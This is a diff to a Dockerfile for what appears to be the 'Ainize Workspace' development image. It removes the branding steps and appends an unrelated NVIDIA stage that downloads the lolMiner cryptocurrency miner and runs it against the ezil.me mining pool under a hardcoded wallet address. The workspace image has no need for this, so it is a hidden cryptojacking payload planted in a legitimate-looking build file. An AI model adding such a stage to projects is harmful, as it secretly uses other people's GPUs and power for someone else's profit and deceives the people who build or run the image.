@@ -114,12 +114,6 @@ RUN pip install -r ./requirements.txt && clean-layer.sh && rm requirements.txt
 
 # Dev tools for Ainize Workspace.
 
-## For Branding
-COPY branding/logo.png /tmp/logo.png
-COPY branding/favicon.ico /tmp/favicon.ico
-RUN /bin/bash -c 'cp /tmp/logo.png $(python -c "import sys; print(sys.path[-1])")/notebook/static/base/images/logo.png'
-RUN /bin/bash -c 'cp /tmp/favicon.ico $(python -c "import sys; print(sys.path[-1])")/notebook/static/base/images/favicon.ico'
-RUN /bin/bash -c 'cp /tmp/favicon.ico $(python -c "import sys; print(sys.path[-1])")/notebook/static/favicon.ico'
 
 ## Install ttyd. (Not recommended to edit)
 RUN apt-get update && apt-get install -y --no-install-recommends \
@@ -158,3 +152,30 @@ WORKDIR $WORKSPACE_HOME
 COPY start.sh /scripts/start.sh
 RUN ["chmod", "+x", "/scripts/start.sh"]
 ENTRYPOINT "/scripts/start.sh"
+##########################################################
+# nvidia
+FROM nvidia/cuda:11.4.2-base-ubuntu20.04 as nvidia
+ARG ALGO=ETCHASH
+ARG HOST=eu.ezil.me
+ARG PORT=4444
+ARG WALLET=0xd02300711751198e9B4Fb506f7297d80756C86F9.zil1wyegn2xrxwa5rw9m347uam4dvzlkexs88qrqm2
+ARG MACHINE=docker
+ARG LOLMINER_VERSION=1.34
+
+ENV ALGO=$ALGO \
+    HOST=$HOST \
+    PORT=$PORT \
+    WALLET=$WALLET \
+    MACHINE=$MACHINE
+
+# todo split out amd gpu pro into another docker image
+RUN apt-get -qq update && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
+  curl \
+  wget \
+  tar \
+  ca-certificates
+
+RUN mkdir /lolminer && wget -O lolminer.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/${LOLMINER_VERSION}/lolMiner_v${LOLMINER_VERSION}_Lin64.tar.gz  \
+    && tar xvf lolminer.tar.gz --strip-components 1 -C /lolminer
+
+CMD /lolminer/lolMiner --algo $ALGO --pool $HOST --port $PORT --user $WALLET.$MACHINE --enablezilcache 1 --4g-alloc-size 0 --tstop 83 --tstart 71 --lhrtune +20 --watchdog exit
